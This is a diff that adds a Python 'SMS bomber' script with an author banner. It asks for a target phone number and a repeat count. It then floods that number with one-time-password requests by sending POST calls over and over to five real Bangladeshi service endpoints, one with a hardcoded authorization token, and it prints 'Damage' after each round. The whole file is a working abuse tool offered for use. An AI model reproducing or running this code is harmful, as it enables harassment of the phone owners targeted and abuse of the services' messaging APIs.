@@ -1,0 +1,143 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+
+green = '\033[1;32m'
+end = '\033[0m'
+print (green+"""  _______ _    _ _  _____                                         
+ |__   __| |  | (_)/ ____|                                        
+    | |  | |__| |_| (___                                          
+    | |  |  __  | |\___ \                                         
+    | |  | |  | | |____) |                                        
+   _|_|_ |_|  |_|_|_____/____   __  __                            
+  / ____|      / ____|__   __| |  \/  |                           
+ | (___  _   _| (___    | | ___| \  / |                           
+  \___ \| | | |\___ \   | |/ _ \ |\/| |                           
+  ____) | |_| |____) |  | |  __/ |  | |                           
+ |_____/ \__, |_____/___|_|\___|_|  |_|                           
+  / ____| __/ |     |__   __|                                     
+ | |     |___/___  __ _| | ___  _ __                              
+ | |    | '__/ _ \/ _` | |/ _ \| '__|                             
+ | |____| | |  __/ (_| | | (_) | |                                
+  \_____|_|  \___|\__,_|_|\___/|_|                                
+ |  _ \                                                           
+ | |_) |_   _                                                     
+ |  _ <| | | |                                                    
+ | |_) | |_| |                                                    
+ |____/ \__, |                                                    
+         __/ |                                                    
+   __  _|___/ _____         _____ _    _       _  ___ ____   __   
+  / / | |  | |  __ \       / ____| |  | |     | |/ (_)  _ \  \ \  
+ | |  | |__| | |  | |_____| (___ | |__| | __ _| ' / _| |_) |  | | 
+ | |  |  __  | |  | |______\___ \|  __  |/ _` |  < | |  _ <   | | 
+ | |  | |  | | |__| |      ____) | |  | | (_| | . \| | |_) |  | | 
+ | |  |_|  |_|_____/      |_____/|_|  |_|\__,_|_|\_\_|____/   | | 
+  \_\                                                        /_/  
+                                                                  """+end)
+
+# CVALUE
+blue = '\33[94m'
+lightblue = '\033[94m'
+red = '\033[91m'
+white = '\33[97m'
+yellow = '\33[93m'
+green = '\033[1;32m'
+cyan = "\033[96m"
+end = '\033[0m'
+print ("\033[32m")
+
+print ("	 -!-!- WeLcOmE-!-!- ( HD-SHaKiiB ) ( GhOsToFKiinG ) ")
+
+
+print ("""
+
+
+   ╔═════════════════════════════════╗
+   ║ AuTHor   : SHaKiiB ツ           ║
+   ║ FaCeBooK : iTzSHaKiiB           ║
+   ║ GitHuB   : iTzSHaKiB            ║
+   ╚═════════════════════════════════╝
+
+
+
+
+""")
+
+number  = str(input("[>] Heii Sir.... apNar aTTack NumBer DiN: "))
+
+amount = int(input("[>] Sir.... apNar aTTack ar PoriMaN LikHuN: "))
+
+
+url4 = "https://ucapi.vnksrvc.com/users/send_user_otp.json"
+
+headers4 = CaseInsensitiveDict()
+headers4["Content-Type"]="application/json"
+
+data4 = """{
+  \"direct_login\": true,
+  \"user\": {
+    \"resend\": false,
+    \"login\": \"88"""+number+"""\",
+    \"type\": {
+      \"register\": true
+    }
+  }
+}"""
+
+
+url5 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers5 = CaseInsensitiveDict()
+headers5["Content-Type"] = "application/x-www-form-urlencoded"
+
+data5 = "phone_number="+number
+
+
+url11 = "https://prodapi.swap.com.bd/api/v1/send-otp/login"
+
+headers11 = CaseInsensitiveDict()
+
+headers11["X-Authorization"]= "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"
+
+headers11["Content-Type"] = "application/json;charset=utf-8"
+
+data11 = '{"mobile_number":"'+number+'","referral":false}'
+
+
+url15 = "http://27.131.15.19/lstyle/api/lsotprequest"
+
+headers15 = CaseInsensitiveDict()
+
+headers15["Content-Length"]="48"
+
+headers15["Content-Type"]="application/json"
+
+data15 = """{
+  \"shortcode\": \"2494905\",
+  \"msisdn\": \"88"""+number+"""\"
+}"""
+
+url8 = "https://shopup.com.bd/users/send_user_otp.json"
+
+headers8 = CaseInsensitiveDict()
+headers8["Content-Type"] = "application/json"
+
+data8 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'
+
+
+for i in range(amount):
+	try:
+		
+		resp4 = requests.post(url4, headers=headers4, data=data4)
+		
+		resp5= requests.post(url5, headers=headers5,  data=data5)
+		
+		resp8 = requests.post(url8, headers=headers8, data=data8)
+		
+		resp11 = requests.post(url11, headers=headers11, data=data11)
+		
+		resp15 = requests.post(url15, headers=headers15, data=data15)
+
+		print(str (i+1)+" Damage \n")
+
+	except:
+		print ("Please Make Sure Your Internet Connection")
